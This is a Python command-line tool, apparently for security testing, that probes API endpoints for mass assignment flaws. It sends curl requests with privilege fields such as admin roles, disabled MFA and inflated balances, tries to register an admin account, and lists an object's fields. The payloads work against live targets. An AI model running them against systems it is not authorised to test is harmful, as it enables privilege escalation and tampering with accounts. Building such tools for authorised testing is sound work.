#!/usr/bin/env python3
"""Detect mass assignment vulnerabilities in API endpoints.

Usage:
    python agent.py --url https://target.com/api/users/me --token TOKEN --test-fields
    python agent.py --url https://target.com/api/register --registration-test
    python agent.py --url https://target.com/api/users/me --token TOKEN --discover
"""

import argparse
import json
import subprocess
from typing import Any


PRIVILEGE_FIELDS = [
    {"role": "admin"},
    {"isAdmin": True},
    {"is_admin": True},
    {"permissions": ["admin"]},
    {"verified": True},
    {"is_verified": True},
    {"balance": 999999},
    {"credit": 999999},
    {"active": True},
    {"approved": True},
    {"level": "premium"},
    {"mfa_enabled": False},
]


def test_mass_assignment(
    url: str, token: str, base_body: dict[str, Any] | None = None
) -> dict[str, Any]:
    """Test endpoint for mass assignment with privilege fields."""
    if base_body is None:
        base_body = {"name": "testuser"}
    findings: list[dict[str, Any]] = []
    for field_dict in PRIVILEGE_FIELDS:
        payload = {**base_body, **field_dict}
        cmd = [
            "curl",
            "-s",
            "-X",
            "PUT",
            url,
            "-H",
            f"Authorization: Bearer {token}",
            "-H",
            "Content-Type: application/json",
            "-d",
            json.dumps(payload),
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            resp = json.loads(result.stdout)
            field_name = list(field_dict.keys())[0]
            field_value = field_dict[field_name]
            if resp.get(field_name) == field_value:
                findings.append(
                    {
                        "field": field_name,
                        "value": field_value,
                        "accepted": True,
                        "risk": "critical",
                    }
                )
            else:
                findings.append(
                    {
                        "field": field_name,
                        "accepted": False,
                        "risk": "none",
                    }
                )
        except (json.JSONDecodeError, subprocess.TimeoutExpired):
            field_name = list(field_dict.keys())[0]
            findings.append({"field": field_name, "error": "parse_error"})
    vulnerable = [f for f in findings if f.get("accepted")]
    return {
        "status": "ok",
        "test": "mass_assignment",
        "vulnerable_fields": len(vulnerable),
        "findings": findings,
    }


def test_registration(url: str) -> dict[str, Any]:
    """Test mass assignment during user registration."""
    payload = {
        "username": "massassign_test",
        "email": "massassign@test.com",
        "password": "Test1234!",
        "role": "admin",
        "isAdmin": True,
        "verified": True,
    }
    cmd = [
        "curl",
        "-s",
        "-X",
        "POST",
        url,
        "-H",
        "Content-Type: application/json",
        "-d",
        json.dumps(payload),
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        resp = json.loads(result.stdout)
        findings = []
        for field in ["role", "isAdmin", "verified"]:
            if field in resp:
                findings.append(
                    {
                        "field": field,
                        "value": resp[field],
                        "injected_value": payload[field],
                        "accepted": resp[field] == payload[field],
                    }
                )
        return {
            "status": "ok",
            "test": "registration_mass_assignment",
            "findings": findings,
        }
    except (json.JSONDecodeError, subprocess.TimeoutExpired):
        return {"error": "Failed to parse registration response"}


def discover_fields(url: str, token: str) -> dict[str, Any]:
    """Discover available fields by reading the current object."""
    cmd = [
        "curl",
        "-s",
        "-H",
        f"Authorization: Bearer {token}",
        url,
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        resp = json.loads(result.stdout)
        return {
            "status": "ok",
            "fields": list(resp.keys()) if isinstance(resp, dict) else [],
            "response": resp,
        }
    except (json.JSONDecodeError, subprocess.TimeoutExpired):
        return {"error": "Failed to read object"}


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Mass assignment vulnerability detector"
    )
    parser.add_argument("--url", required=True, help="Target API endpoint")
    parser.add_argument("--token", help="Authorization token")
    parser.add_argument("--test-fields", action="store_true")
    parser.add_argument("--registration-test", action="store_true")
    parser.add_argument("--discover", action="store_true")
    parser.add_argument("--format", choices=["json", "text"], default="json")
    args = parser.parse_args()

    if args.test_fields and args.token:
        result = test_mass_assignment(args.url, args.token)
    elif args.registration_test:
        result = test_registration(args.url)
    elif args.discover and args.token:
        result = discover_fields(args.url, args.token)
    else:
        parser.error(
            "Use --test-fields/--discover with --token, or --registration-test"
        )
        return

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
